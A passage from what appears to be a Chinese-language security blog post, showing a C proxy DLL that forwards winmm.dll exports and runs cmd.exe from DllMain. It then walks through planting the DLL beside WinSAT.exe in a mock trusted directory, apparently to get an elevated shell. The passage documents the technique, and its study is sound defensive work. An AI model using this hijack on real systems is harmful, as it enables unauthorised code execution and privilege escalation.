class="hljs-string">&quot;/export:midiStreamProperty=[FORWARD_DLL_HERE].midiStreamProperty,@90&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiStreamRestart=[FORWARD_DLL_HERE].midiStreamRestart,@91&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:midiStreamStop=[FORWARD_DLL_HERE].midiStreamStop,@92&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mixerClose=[FORWARD_DLL_HERE].mixerClose,@93&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mixerGetControlDetailsA=[FORWARD_DLL_HERE].mixerGetControlDetailsA,@94&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mixerGetControlDetailsW=[FORWARD_DLL_HERE].mixerGetControlDetailsW,@95&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mixerGetDevCapsA=[FORWARD_DLL_HERE].mixerGetDevCapsA,@96&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mixerGetDevCapsW=[FORWARD_DLL_HERE].mixerGetDevCapsW,@97&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mixerGetID=[FORWARD_DLL_HERE].mixerGetID,@98&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mixerGetLineControlsA=[FORWARD_DLL_HERE].mixerGetLineControlsA,@99&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mixerGetLineControlsW=[FORWARD_DLL_HERE].mixerGetLineControlsW,@100&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mixerGetLineInfoA=[FORWARD_DLL_HERE].mixerGetLineInfoA,@101&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mixerGetLineInfoW=[FORWARD_DLL_HERE].mixerGetLineInfoW,@102&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mixerGetNumDevs=[FORWARD_DLL_HERE].mixerGetNumDevs,@103&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mixerMessage=[FORWARD_DLL_HERE].mixerMessage,@104&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mixerOpen=[FORWARD_DLL_HERE].mixerOpen,@105&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mixerSetControlDetails=[FORWARD_DLL_HERE].mixerSetControlDetails,@106&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mmDrvInstall=[FORWARD_DLL_HERE].mmDrvInstall,@107&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mmGetCurrentTask=[FORWARD_DLL_HERE].mmGetCurrentTask,@108&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mmTaskBlock=[FORWARD_DLL_HERE].mmTaskBlock,@109&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mmTaskCreate=[FORWARD_DLL_HERE].mmTaskCreate,@110&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mmTaskSignal=[FORWARD_DLL_HERE].mmTaskSignal,@111&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mmTaskYield=[FORWARD_DLL_HERE].mmTaskYield,@112&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mmioAdvance=[FORWARD_DLL_HERE].mmioAdvance,@113&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mmioAscend=[FORWARD_DLL_HERE].mmioAscend,@114&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mmioClose=[FORWARD_DLL_HERE].mmioClose,@115&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mmioCreateChunk=[FORWARD_DLL_HERE].mmioCreateChunk,@116&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mmioDescend=[FORWARD_DLL_HERE].mmioDescend,@117&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mmioFlush=[FORWARD_DLL_HERE].mmioFlush,@118&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mmioGetInfo=[FORWARD_DLL_HERE].mmioGetInfo,@119&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mmioInstallIOProcA=[FORWARD_DLL_HERE].mmioInstallIOProcA,@120&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mmioInstallIOProcW=[FORWARD_DLL_HERE].mmioInstallIOProcW,@121&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mmioOpenA=[FORWARD_DLL_HERE].mmioOpenA,@122&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mmioOpenW=[FORWARD_DLL_HERE].mmioOpenW,@123&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mmioRead=[FORWARD_DLL_HERE].mmioRead,@124&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mmioRenameA=[FORWARD_DLL_HERE].mmioRenameA,@125&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mmioRenameW=[FORWARD_DLL_HERE].mmioRenameW,@126&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mmioSeek=[FORWARD_DLL_HERE].mmioSeek,@127&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mmioSendMessage=[FORWARD_DLL_HERE].mmioSendMessage,@128&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mmioSetBuffer=[FORWARD_DLL_HERE].mmioSetBuffer,@129&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mmioSetInfo=[FORWARD_DLL_HERE].mmioSetInfo,@130&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mmioStringToFOURCCA=[FORWARD_DLL_HERE].mmioStringToFOURCCA,@131&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mmioStringToFOURCCW=[FORWARD_DLL_HERE].mmioStringToFOURCCW,@132&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mmioWrite=[FORWARD_DLL_HERE].mmioWrite,@133&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:mmsystemGetVersion=[FORWARD_DLL_HERE].mmsystemGetVersion,@134&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:sndPlaySoundA=[FORWARD_DLL_HERE].sndPlaySoundA,@135&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:sndPlaySoundW=[FORWARD_DLL_HERE].sndPlaySoundW,@136&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:timeBeginPeriod=[FORWARD_DLL_HERE].timeBeginPeriod,@137&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:timeEndPeriod=[FORWARD_DLL_HERE].timeEndPeriod,@138&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:timeGetDevCaps=[FORWARD_DLL_HERE].timeGetDevCaps,@139&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:timeGetSystemTime=[FORWARD_DLL_HERE].timeGetSystemTime,@140&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:timeGetTime=[FORWARD_DLL_HERE].timeGetTime,@141&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:timeKillEvent=[FORWARD_DLL_HERE].timeKillEvent,@142&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:timeSetEvent=[FORWARD_DLL_HERE].timeSetEvent,@143&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveInAddBuffer=[FORWARD_DLL_HERE].waveInAddBuffer,@144&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveInClose=[FORWARD_DLL_HERE].waveInClose,@145&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveInGetDevCapsA=[FORWARD_DLL_HERE].waveInGetDevCapsA,@146&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveInGetDevCapsW=[FORWARD_DLL_HERE].waveInGetDevCapsW,@147&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveInGetErrorTextA=[FORWARD_DLL_HERE].waveInGetErrorTextA,@148&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveInGetErrorTextW=[FORWARD_DLL_HERE].waveInGetErrorTextW,@149&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveInGetID=[FORWARD_DLL_HERE].waveInGetID,@150&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveInGetNumDevs=[FORWARD_DLL_HERE].waveInGetNumDevs,@151&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveInGetPosition=[FORWARD_DLL_HERE].waveInGetPosition,@152&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveInMessage=[FORWARD_DLL_HERE].waveInMessage,@153&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveInOpen=[FORWARD_DLL_HERE].waveInOpen,@154&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveInPrepareHeader=[FORWARD_DLL_HERE].waveInPrepareHeader,@155&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveInReset=[FORWARD_DLL_HERE].waveInReset,@156&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveInStart=[FORWARD_DLL_HERE].waveInStart,@157&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveInStop=[FORWARD_DLL_HERE].waveInStop,@158&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveInUnprepareHeader=[FORWARD_DLL_HERE].waveInUnprepareHeader,@159&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveOutBreakLoop=[FORWARD_DLL_HERE].waveOutBreakLoop,@160&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveOutClose=[FORWARD_DLL_HERE].waveOutClose,@161&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveOutGetDevCapsA=[FORWARD_DLL_HERE].waveOutGetDevCapsA,@162&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveOutGetDevCapsW=[FORWARD_DLL_HERE].waveOutGetDevCapsW,@163&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveOutGetErrorTextA=[FORWARD_DLL_HERE].waveOutGetErrorTextA,@164&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveOutGetErrorTextW=[FORWARD_DLL_HERE].waveOutGetErrorTextW,@165&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveOutGetID=[FORWARD_DLL_HERE].waveOutGetID,@166&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveOutGetNumDevs=[FORWARD_DLL_HERE].waveOutGetNumDevs,@167&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveOutGetPitch=[FORWARD_DLL_HERE].waveOutGetPitch,@168&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveOutGetPlaybackRate=[FORWARD_DLL_HERE].waveOutGetPlaybackRate,@169&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveOutGetPosition=[FORWARD_DLL_HERE].waveOutGetPosition,@170&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveOutGetVolume=[FORWARD_DLL_HERE].waveOutGetVolume,@171&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveOutMessage=[FORWARD_DLL_HERE].waveOutMessage,@172&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveOutOpen=[FORWARD_DLL_HERE].waveOutOpen,@173&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveOutPause=[FORWARD_DLL_HERE].waveOutPause,@174&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveOutPrepareHeader=[FORWARD_DLL_HERE].waveOutPrepareHeader,@175&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveOutReset=[FORWARD_DLL_HERE].waveOutReset,@176&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveOutRestart=[FORWARD_DLL_HERE].waveOutRestart,@177&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveOutSetPitch=[FORWARD_DLL_HERE].waveOutSetPitch,@178&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveOutSetPlaybackRate=[FORWARD_DLL_HERE].waveOutSetPlaybackRate,@179&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveOutSetVolume=[FORWARD_DLL_HERE].waveOutSetVolume,@180&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveOutUnprepareHeader=[FORWARD_DLL_HERE].waveOutUnprepareHeader,@181&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/export:waveOutWrite=[FORWARD_DLL_HERE].waveOutWrite,@182&quot;</span>)</span><br><br><br><span class="hljs-function">BOOL WINAPI <span class="hljs-title">DllMain</span><span class="hljs-params">(HINSTANCE hInst, DWORD reason, LPVOID)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;start cmd.exe&quot;</span>);<br><br>	<span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>编译之后生成DLL文件</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230415164041781.png"  ><span class="image-caption">image-20230415164041781</span></p>
<p>然后将DLL文件改名为winmm.dll</p>
<p>放入模拟可信任根目录</p>
<p>最后打开模拟可信任根目录中的WinSAT.exe, <font color='red'>发现会弹出提示, 没有[FORWARD_DLL_HERE].dll文件</font></p>
<p>这个地方卡了一下</p>
<p>需要把真正的winmm.dll文件复制一份, 重新命名为[FORWARD_DLL_HERE].dll, 放入模拟可信任根目录</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230415164326293.png"  ><span class="image-caption">image-20230415164326293</span></p>
<p>然后运行发现缺少两个DLL文件, 把原始目录的DLL文件复制一份放到模拟根目录就行</p>
<p>点击运行WinSAT.exe即可弹出cmd窗口</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230415164408617.png"  ><span class="image-caption">image-20230415164408617</span></p>
]]></content>
      <categories>
